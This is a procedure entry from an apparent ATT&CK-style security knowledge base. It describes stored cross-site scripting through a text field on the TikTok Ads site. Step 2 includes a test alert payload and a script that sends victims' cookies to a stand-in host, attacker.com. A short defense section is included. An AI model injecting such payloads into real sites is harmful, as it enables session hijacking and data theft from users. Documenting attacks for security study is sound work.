---
id: proc-uuid-5678
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.562Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Text-Field

## Summary

This procedure exploits insufficient input sanitization in a web application's text field to inject and store malicious JavaScript, which persists server-side and executes in the browsers of users who view the content, as seen in the TikTok Ads platform vulnerability.

## Description

In the context of ads.tiktok.com, the text field lacks proper output encoding, allowing attackers to submit HTML/JavaScript payloads that are stored in the database and rendered unsafely when displayed. This leads to arbitrary code execution in victims' browsers, enabling attacks like cookie theft for session hijacking or page defacement. Prerequisites include a user account; no advanced tools are needed beyond a browser. Expected outcomes: persistent payload storage and execution upon viewing.

## Requirements

1. Valid login credentials for the target service (e.g., TikTok Ads account)
2. Access to the vulnerable text field via the web interface
3. Knowledge of JavaScript for crafting payloads

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using HTML entity encoding)
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous script submissions via WAF logs

## Objectives

1. Store malicious JavaScript persistently on the server
2. Achieve execution in victim browser contexts
3. Enable secondary impacts like data theft

## Instructions

### Step 1: Access the Vulnerable Form

**Context**: Log in and navigate to the ad creation/editing page to reach the text field.

Open ads.tiktok.com in a browser, authenticate, and locate the text input area for ad descriptions or similar.

### Step 2: Craft and Submit Payload

**Context**: Test and inject a payload that evades basic filters and executes on render.

Use a simple payload for testing:

```html
<script>alert('XSS Test');</script>
```

Or for exfiltration:

```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>
```

Submit the form. The payload is stored without sanitization.

### Step 3: Verify Storage

**Context**: Confirm the payload is persisted and retrievable.

Reload or access the stored content page; inspect the HTML source to see the raw script tag.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
